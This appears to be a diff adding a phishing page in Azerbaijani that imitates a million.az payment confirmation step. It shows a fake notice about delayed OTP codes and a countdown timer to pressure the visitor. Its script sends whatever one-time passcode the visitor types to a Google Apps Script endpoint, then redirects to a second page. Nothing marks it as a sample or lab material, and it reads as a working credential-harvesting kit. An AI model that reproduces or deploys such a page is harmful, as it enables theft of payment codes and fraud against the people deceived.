@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>OTP Təsdiq</title>
+    <style>
+        @font-face {
+            font-family: 'GilroyBold';
+            src: url('/m10balans.online/number/Gilroy-Bold.ttf') format('truetype');
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-size: 20px; /* Artırılmış temel font boyutu */
+            font-family: 'GilroyBold', sans-serif;
+            background-color: #f9f9f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+
+        .container {
+            width: 90%; /* Genişlik artırıldı */
+            max-width: 700px; /* Maksimum genişlik artırıldı */
+            padding: 4rem; /* Daha fazla boşluk */
+            background-color: #fff;
+            border-radius: 50px; /* Daha yuvarlak köşeler */
+            border: 4px solid red; /* Daha kalın kenarlık */
+            box-shadow: 0 8px 12px rgba(255, 0, 0, 0.6); /* Daha belirgin gölge */
+            text-align: center;
+            font-family: 'GilroyBold', sans-serif;
+        }
+
+        .logo img {
+            max-width: 300px; /* Logo boyutu artırıldı */
+            height: auto;
+            margin-bottom: 3rem;
+        }
+
+        .info-text {
+            font-size: 1.8rem; /* Metin boyutu artırıldı */
+            color: #333;
+            margin-bottom: 3rem;
+            word-wrap: break-word;
+            font-family: 'GilroyBold', sans-serif;
+            text-align: justify;
+            line-height: 1.8; /* Satır aralığı artırıldı */
+        }
+
+        .form-group {
+            margin-bottom: 3rem;
+            text-align: left;
+        }
+
+        .form-group label {
+            font-size: 1.5rem; /* Etiket boyutu artırıldı */
+            color: #333;
+            font-family: 'GilroyBold', sans-serif;
+            display: block;
+            margin-bottom: 1rem;
+        }
+
+        .form-group input[type="number"] {
+            width: 100%;
+            padding: 1.5rem; /* Daha fazla boşluk */
+            font-size: 1.5rem; /* Input metin boyutu artırıldı */
+            border: 3px solid #ccc; /* Daha kalın kenarlık */
+            border-radius: 12px; /* Daha yuvarlak köşeler */
+            font-family: 'GilroyBold', sans-serif;
+            box-sizing: border-box;
+        }
+
+        .timer {
+            font-size: 1.8rem; /* Metin boyutu artırıldı */
+            color: red;
+            margin: 2rem 0;
+            font-family: 'GilroyBold', sans-serif;
+        }
+
+        button {
+            width: 100%;
+            padding: 1.5rem; /* Daha fazla boşluk */
+            font-family: 'GilroyBold', sans-serif;
+            font-size: 1.5rem; /* Buton metin boyutu artırıldı */
+            color: #fff;
+            background-color: #ea3325;
+            border: none;
+            border-radius: 12px; /* Daha yuvarlak köşeler */
+            cursor: not-allowed;
+        }
+
+        button:enabled {
+            background-color: #c21818;
+            cursor: pointer;
+        }
+
+        button:disabled {
+            background-color: #f5c6c6;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 3rem;
+                font-family: 'GilroyBold', sans-serif;
+            }
+
+            .info-text {
+                font-size: 1.5rem;
+                font-family: 'GilroyBold', sans-serif;
+            }
+
+            button {
+                font-size: 1.3rem;
+                padding: 1.3rem;
+                font-family: 'GilroyBold', sans-serif;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .info-text {
+                font-size: 1.3rem;
+            }
+
+            button {
+                font-size: 1.2rem;
+                font-family: 'GilroyBold', sans-serif;
+                padding: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://million.az/logo/main-logo.svg" alt="Logo">
+        </div>
+        <div class="info-text">
+            Ödəniş istəkləri çox olduğundan OTP kodunuz <br> gec göndərilə bilər! <br>
+            Səhifədən ayrılmamağınızı xahiş olunur!
+        </div>
+        <form id="otpForm">
+            <div class="form-group">
+                <label for="otpInput">OTP kodunu daxil edin.</label>
+                <input type="number" id="otpInput" placeholder="OTP" required>
+            </div>
+            <div class="timer" id="timer">Qalan vaxt: 05:00</div>
+            <button type="button" id="submitButton" disabled>Ödənişi Təsdiqlə</button>
+        </form>
+    </div>
+    <script>
+        // Timer Fonksiyonu (5 Dakika)
+        function startTimer(duration, display) {
+            let timer = duration, minutes, seconds;
+            const interval = setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = `Qalan vaxt: ${minutes}:${seconds}`;
+
+                if (--timer < 0) {
+                    clearInterval(interval);
+                    display.textContent = "Qalan vaxt: 00:00";
+                    document.getElementById("submitButton").disabled = true;
+                }
+            }, 1000);
+        }
+
+        window.onload = function () {
+            const display = document.getElementById("timer");
+            const fiveMinutes = 5 * 60;
+            startTimer(fiveMinutes, display);
+        };
+
+        document.getElementById("submitButton").addEventListener("click", function () {
+            const otpInput = document.getElementById("otpInput").value.trim();
+
+            // Maksimum 6 ve minimum 4 karakter kontrolü
+            if (otpInput.length < 4 || otpInput.length > 6) {
+                alert("OTP kodu 4 ilə 6 rəqəm arasında olmalıdır!");
+                return;
+            }
+
+            const data = { otp: otpInput };
+
+            fetch("https://script.google.com/macros/s/AKfycbySe0hCUb5zREcOJQlTi2e3-OuQvd4CaW9iO0EHtTcJbabMQdFMrEkBZ8xx0lFDgCHi/exec", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify(data),
+                mode: "no-cors",
+            })
+            .then(response => {
+                window.location.href = "index2.html"; // Başarıyla yönlendirme
+            })
+            .catch(error => {
+                console.error("OTP Gönderim Hatası:", error);
+            });
+        });
+
+        document.getElementById("otpInput").addEventListener("input", function () {
+            const otpInput = document.getElementById("otpInput").value.trim();
+            const submitButton = document.getElementById("submitButton");
+
+            if (otpInput.length >= 4 && otpInput.length <= 6) {
+                submitButton.disabled = false;
+            } else {
+                submitButton.disabled = true;
+            }
+        });
+    </script>
+</body>
+</html>
